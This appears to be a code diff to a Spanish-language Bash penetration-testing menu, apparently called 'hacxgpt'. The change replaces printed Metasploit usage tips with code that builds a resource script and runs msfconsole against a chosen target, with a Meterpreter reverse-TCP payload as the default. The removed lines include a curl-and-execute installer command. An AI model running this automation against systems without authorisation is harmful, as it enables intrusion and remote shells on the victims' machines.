@@ -817,32 +817,39 @@ suite_pentesting() {
         case $opcion in
             1)
                 echo ""
-                echo -e "${YELLOW}🔍 METASPLOIT FRAMEWORK:${NC}"
+                echo -e "${YELLOW}🔍 METASPLOIT FRAMEWORK — Resource Script${NC}"
                 echo ""
-                if command -v msfconsole &>/dev/null; then
-                    read -p "🎮 ¿Deseas lanzar msfconsole interactivo ahora? (s/N): " launch_msf
-                    if [[ "${launch_msf,,}" =~ ^s ]]; then
-                        if confirm_risk "Metasploit Framework (msfconsole)" "ALTO" "${TARGET:-[IP]}"; then
-                            type track_technique &>/dev/null && track_technique "T1210" "Exploitation of Remote Services (Metasploit)"
-                            msfconsole
-                        fi
-                    else
-                        echo "• Iniciar: msfconsole"
-                        echo "• Buscar exploit: search [nombre]"
-                        echo "• Usar exploit: use exploit/[ruta]"
-                        echo "• Mostrar opciones: show options"
-                        echo "• Configurar: set RHOSTS ${TARGET:-[IP]}"
-                        echo "• Ejecutar: exploit"
-                    fi
-                else
-                    echo "• Iniciar: msfconsole"
-                    echo "• Buscar exploit: search [nombre]"
-                    echo "• Usar exploit: use exploit/[ruta]"
-                    echo "• Mostrar opciones: show options"
-                    echo "• Configurar: set RHOSTS ${TARGET:-[IP]}"
-                    echo "• Ejecutar: exploit"
+                if check_command msfconsole; then
+                    read -p "🎯 Módulo MSF [exploit/multi/handler]: " msf_module
+                    msf_module="${msf_module:-exploit/multi/handler}"
+                    read -p "💣 Payload [windows/meterpreter/reverse_tcp]: " msf_payload
+                    msf_payload="${msf_payload:-windows/meterpreter/reverse_tcp}"
+                    read -p "🌐 RHOSTS/objetivo [${TARGET:-192.168.1.1}]: " msf_rhosts
+                    msf_rhosts="${msf_rhosts:-${TARGET:-192.168.1.1}}"
+                    read -p "🖥️  LHOST (tu IP): " msf_lhost
+                    read -p "🔌 LPORT [4444]: " msf_lport
+                    msf_lport="${msf_lport:-4444}"
                     echo ""
-                    echo -e "${YELLOW}💡 Para instalar Metasploit:${NC} curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && ./msfinstall"
+                    if confirm_risk "Metasploit Framework" "ALTO" "$msf_rhosts"; then
+                        local rc_file="/tmp/hacxgpt_msf_$$.rc"
+                        cat > "$rc_file" << MSFEOF
+use $msf_module
+set RHOSTS $msf_rhosts
+set PAYLOAD $msf_payload
+set LHOST $msf_lhost
+set LPORT $msf_lport
+run
+exit
+MSFEOF
+                        echo ""
+                        echo -e "${YELLOW}▶️  Ejecutando: msfconsole -q -r $rc_file${NC}"
+                        echo ""
+                        output=$(msfconsole -q -r "$rc_file" 2>&1)
+                        echo "$output"
+                        rm -f "$rc_file"
+                        save_output "[METASPLOIT $msf_rhosts | $msf_module]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1210" "Exploitation of Remote Services (Metasploit)"
+                    fi
                 fi
                 ;;
             2)
